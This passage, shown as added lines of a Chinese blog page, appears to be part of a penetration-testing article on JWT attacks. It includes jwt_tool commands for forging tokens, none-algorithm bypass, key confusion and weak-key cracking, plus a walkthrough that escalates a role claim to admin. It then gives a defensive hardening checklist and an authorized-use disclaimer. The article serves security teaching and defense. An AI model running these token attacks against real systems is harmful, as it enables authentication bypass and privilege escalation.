+<td>自动检测漏洞</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt; -t URL -rc &quot;jwt=&lt;JWT&gt;&quot; -M at</code></td>
+</tr>
+<tr>
+<td>篡改</td>
+<td>交互式修改payload</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt; -I</code></td>
+</tr>
+<tr>
+<td>伪造</td>
+<td>指定密钥签名</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt; -S hs256 -p &quot;secret&quot;</code></td>
+</tr>
+<tr>
+<td>None</td>
+<td>切换为none算法</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt; -X a</code></td>
+</tr>
+<tr>
+<td>混淆</td>
+<td>密钥类型混淆</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt; -X k -pk public.pem</code></td>
+</tr>
+<tr>
+<td>爆破</td>
+<td>弱密钥破解</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt; -C -d wordlist.txt</code></td>
+</tr>
+<tr>
+<td>Playbook</td>
+<td>自动化攻击链</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt; -t URL -M pb</code></td>
+</tr>
+</tbody></table>
+<p><strong>完整测试流程</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 基本信息与漏洞扫描</span></span><br><span class="line">python3 jwt_tool.py eyJ... -t https://target.com/api -rc <span class="string">&quot;Authorization: Bearer eyJ...&quot;</span> -M at</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 交互式修改权限字段</span></span><br><span class="line">python3 jwt_tool.py eyJ... -I -pc role -pv admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 尝试none算法绕过</span></span><br><span class="line">python3 jwt_tool.py eyJ... -X a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 密钥混淆攻击</span></span><br><span class="line">python3 jwt_tool.py eyJ... -X k -pk pubkey.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 弱密钥暴力破解</span></span><br><span class="line">python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-Burp-Suite-—-JWT-Editor"><a href="#3-2-Burp-Suite-—-JWT-Editor" class="headerlink" title="3.2 Burp Suite — JWT Editor"></a>3.2 Burp Suite — JWT Editor</h3><p>JWT Editor 是 Burp 扩展（BApp Store 安装），可在 Proxy&#x2F;Repeater 中识别、解码和修改 JWT。</p>
+<p><strong>核心功能</strong>：</p>
+<ol>
+<li><strong>自动标签页</strong>：Proxy 历史中高亮 JWT，提供可视化 Editor 面板</li>
+<li><strong>嵌入式编辑</strong>：在 Repeater 中直接修改 header&#x2F;payload</li>
+<li><strong>密钥管理</strong>：支持添加 RSA&#x2F;JWK 密钥用于签名验证</li>
+<li><strong>快捷攻击</strong>：一键切换 <code>none</code> 算法、注入 Embedded JWK、使用托管密钥签名</li>
+</ol>
+<p><strong>Burp攻击工作流</strong>：</p>
+<pre class="mermaid">flowchart LR
+    A[拦截请求]-->B[Repeater]
+    B-->C[JWT Editor面板]
+    C-->D[修改Header/Payload]
+    D-->E{需要签名?}
+    E-->|是|F[生成或选择密钥]
+    F-->G[Extension自动签名]
+    E-->|否/None|H[直接发送]
+    G-->H
+    H-->I[分析响应]</pre>
+
+<h3 id="3-3-其他辅助工具"><a href="#3-3-其他辅助工具" class="headerlink" title="3.3 其他辅助工具"></a>3.3 其他辅助工具</h3><ul>
+<li><strong>jwt-cracker</strong>：轻量级弱密钥暴力破解（纯JavaScript实现）</li>
+<li><strong>PyJWT</strong>：Python库，适合编写自定义攻击脚本</li>
+<li><strong>CyberChef</strong>：在线&#x2F;离线快速JWT编解码与分析</li>
+</ul>
+<hr>
+<h2 id="四、JWT-Payload敏感信息泄露"><a href="#四、JWT-Payload敏感信息泄露" class="headerlink" title="四、JWT Payload敏感信息泄露"></a>四、JWT Payload敏感信息泄露</h2><p>JWT 默认<strong>仅签名不加密</strong>（除非使用 JWE），任何人都可 Base64 解码 payload。</p>
+<h3 id="4-1-常见泄露场景"><a href="#4-1-常见泄露场景" class="headerlink" title="4.1 常见泄露场景"></a>4.1 常见泄露场景</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user-12345&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@company.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cleartext_hunter2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ssn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123-45-6789&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;superadmin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ldap_dn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CN=Admin,OU=VIP,DC=internal,DC=corp&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;internal_user_level&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tenant_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ent-b8a3-2021q4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-信息收集价值"><a href="#4-2-信息收集价值" class="headerlink" title="4.2 信息收集价值"></a>4.2 信息收集价值</h3><ul>
+<li><strong><code>kid</code></strong>：可推断密钥命名规范和存储位置</li>
+<li><strong><code>iss</code></strong>：暴露内部域名或微服务名</li>
+<li><strong><code>iat</code> &#x2F; <code>exp</code></strong>：判断令牌生命周期和服务器时钟偏差</li>
+<li><strong>自定义claim</strong>：泄露内部字段命名约定（<code>internal_user_level</code>、<code>tenant_id</code>）</li>
+</ul>
+<h3 id="4-3-加固建议"><a href="#4-3-加固建议" class="headerlink" title="4.3 加固建议"></a>4.3 加固建议</h3><ol>
+<li>仅存储最小必要声明，不存储密码、身份证号等敏感数据</li>
+<li>敏感信息使用 JWE（JSON Web Encryption）加密</li>
+<li>使用不透明引用令牌（reference token）替代自包含令牌</li>
+<li>设定短过期时间（15分钟），配合 refresh token 轮换</li>
+</ol>
+<hr>
+<h2 id="五、防御加固Checklist"><a href="#五、防御加固Checklist" class="headerlink" title="五、防御加固Checklist"></a>五、防御加固Checklist</h2><table>
+<thead>
+<tr>
+<th>措施</th>
+<th>说明</th>
+<th>优先级</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>算法白名单</td>
+<td>显式指定允许的 <code>alg</code>，拒绝 <code>none</code></td>
+<td>高</td>
+</tr>
+<tr>
+<td>密钥类型隔离</td>
+<td>HS密钥仅用于HMAC，RS密钥仅用于RSA</td>
+<td>高</td>
+</tr>
+<tr>
+<td>禁用危险header</td>
+<td>禁止 <code>jku</code>、<code>jwk</code> 等外部密钥引用</td>
+<td>高</td>
+</tr>
+<tr>
+<td>kid白名单</td>
+<td>使用映射表，禁止路径拼接</td>
+<td>中</td>
+</tr>
+<tr>
+<td>强密钥</td>
+<td>HMAC &gt;&#x3D; 256位，RSA &gt;&#x3D; 2048位</td>
+<td>中</td>
+</tr>
+<tr>
+<td>短有效期</td>
+<td>Access token 15min，Refresh token 轮换</td>
+<td>中</td>
+</tr>
+<tr>
+<td>加密Payload</td>
+<td>敏感数据使用JWE或不透明令牌</td>
+<td>中</td>
+</tr>
+<tr>
+<td>库更新</td>
+<td>跟踪JWT库CVE公告</td>
+<td>低</td>
+</tr>
+<tr>
+<td>日志监控</td>
+<td>监控签名失败和异常算法切换</td>
+<td>低</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>JWT 的安全高度依赖正确的实现与配置，攻击面集中在算法混淆、密钥来源信任和签名验证逻辑三个方向。渗透测试人员应熟练使用 jwt_tool 和 Burp JWT Editor，开发人员则应在设计和代码审查阶段将防御措施纳入考量。跟踪JWT库安全公告、定期审计令牌处理逻辑，才能在高强度对抗中保持主动。</p>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p>本文所述技术仅用于授权的安全评估、渗透测试及安全研究。未经系统所有者明确授权，对任何系统进行测试均可能违反法律法规。作者及发布平台不对读者基于本文内容的行为及其后果承担责任。使用者应确保其行为符合其所在地区的法律法规及行业规范。</p>
+</blockquote>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7519">RFC 7519 — JSON Web Token</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt">PortSwigger — JWT Attacks</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">OWASP — JWT Cheat Sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens">HackTricks — JWT</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8/" rel="tag"># 认证安全</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Prototype-pollution/" rel="prev" title="原型链污染攻击">
+                  <i class="fa fa-angle-left"></i> 原型链污染攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/OAuth-attacks/" rel="next" title="OAuth 2.0攻击面">
+                  OAuth 2.0攻击面 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
